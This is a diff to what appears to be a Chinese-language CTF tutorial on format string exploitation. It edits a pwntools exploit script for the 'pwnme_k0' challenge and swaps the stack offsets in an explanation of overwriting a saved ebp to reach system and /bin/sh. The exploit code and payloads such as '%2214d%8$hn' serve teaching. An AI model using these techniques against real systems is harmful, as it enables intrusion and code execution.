@@ -435,9 +435,9 @@ if args['REMOTE']:
     sh = remote(11, 11)
 else:
     sh = process('./pwnme_k0')
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline('a' * 8)
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline('%p' * 9)
 sh.recvuntil('>')
 sh.sendline('1')
@@ -449,9 +449,9 @@ rbp = int(data[5], 16)
 ret_addr = rbp - 0x38
 sh.recvuntil('>')
 sh.sendline('2')
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline(p64(ret_addr))
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 payload = '%2214d%8$hn'
 sh.sendline(payload)
 sh.recvuntil('>')
@@ -611,9 +611,9 @@ The index of format argument : 32
 
 这样我们便可以得到对应的地址了。进而可以根据libc-database来获取对应的libc，继而获取system函数地址与/bin/sh函数地址了。
 
-其次，我们可以确定栈上存储格式化字符串的地址0xffffcd2c相对于格式化字符串的偏移为6，得到这个是为了构造我们的联系人。
+其次，我们可以确定栈上存储格式化字符串的地址0xffffcd2c相对于格式化字符串的偏移为11，得到这个是为了构造我们的联系人。
 
-再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为11，这样我们可以直接修改上层函数存储的ebp的值。
+再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为6，这样我们可以直接修改上层函数存储的ebp的值。
 
 ```shell
 0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
@@ -635,7 +635,7 @@ The index of format argument : 32
 
 由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。
 
-上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为11，所以我们可以构造如下的payload来进行修改相应的值。
+上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为6，所以我们可以构造如下的payload来进行修改相应的值。
 
 ```
 part1 = (heap_addr - 4) / 2
